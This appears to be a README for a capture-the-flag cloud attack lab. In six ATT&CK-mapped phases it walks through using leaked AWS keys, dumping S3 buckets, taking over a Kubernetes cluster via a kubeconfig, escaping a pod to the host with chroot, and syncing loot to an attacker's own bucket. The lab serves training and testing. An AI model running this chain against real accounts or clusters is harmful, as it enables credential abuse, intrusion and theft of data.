> This repository is for educational and ethical testing purposes only. Do not use any information here on unauthorized systems.

# Essential-Tools-to-Win-Magic-CTF

#  cloudcreds2exfil – From Clues to Cluster

>  A cloud adversary simulation that begins with a tiny leak and ends in full-blown compromise. Can you trace the entire chain?

---

## The Premise

You have discovered an unguarded secret. Somewhere in this repo lies a path that leads from the cloud to the cluster — and deeper still.

Each phase builds upon the last. Stay sharp, question everything.

---

## Objectives
-Exfiltrate data from unexpected places


### Phase 1: Something’s hiding in plain sight  
> _"Source code rarely lies. Look deep, not wide."

You’ve found a pair of keys. But who do they belong to?

- **T1528: Steal Application Access Token**
- **T1552.001: Unprotected Credentials in Files**

####  Commands

# Configure the AWS CLI with the leaked keys
aws configure

# Confirm identity
aws sts get-caller-identity

  ### Phase 2: Objects may be closer than they appear  
> _"They left the door ajar — you just need to push."_

The object store knows more than it should.

** MITRE ATT&CK Mapping**  
- **T1530**: Data from Cloud Storage Object  
- **T1083**: File and Directory Discovery

####  Commands

# List accessible buckets
aws s3 ls

# Explore an interesting bucket
aws s3 ls s3://<your-s3-bucket-name>

# Download everything from the bucket
aws s3 sync s3://<your-s3-bucket-name> ./<your-local-sync-dir>

### Phase 3: A config speaks volumes  
> _"You now speak the cluster’s language."_

With kubeconfig in hand, you're not just an outsider anymore.

** MITRE ATT&CK Mapping**  
- **T1592.002**: Gather Cloud Infrastructure Configuration - Container Orchestration  
- **T1609**: Kubernetes API Access

# Set the path to the retrieved kubeconfig file
export KUBECONFIG=<path-to-your-kubeconfig>

# Verify cluster access
kubectl get pods -A
kubectl get nodes

###  Phase 4: Craft with intent  
> _"Containers are guests — some overstay and snoop around."_

You don’t need a weapon. Just access.

** MITRE ATT&CK Mapping**  
- **T1610**: Deploy Container  
- **T1611**: Escape to Host
  
####  Commands
kubectl apply -f <pod-manifest>.yaml
kubectl exec -it <<podname>> -- /bin/bash

###  Phase 5: Crossing the line  
> _"If you're reading this, you’re probably in the wrong place."_

Your pod can see more than it should.

** MITRE ATT&CK Mapping**  
- **T1057**: Process Discovery  
- **T1082**: System Information Discovery

ls /host
chroot /host  
hostname

### Phase 6: Leave a trail — or don’t  
> _"Loot is only valuable when carried out."_

** MITRE ATT&CK Mapping**  
- **T1537**: Transfer Data to Cloud Account  
- **T1005**: Data from Local System  
- **T1041**: Exfiltration Over C2 Channel


# use AWS CLI from host (if credentials found)

#  sync larger loot
aws s3 sync <<object>> s3://<your-exfil-bucket>/<objects>>






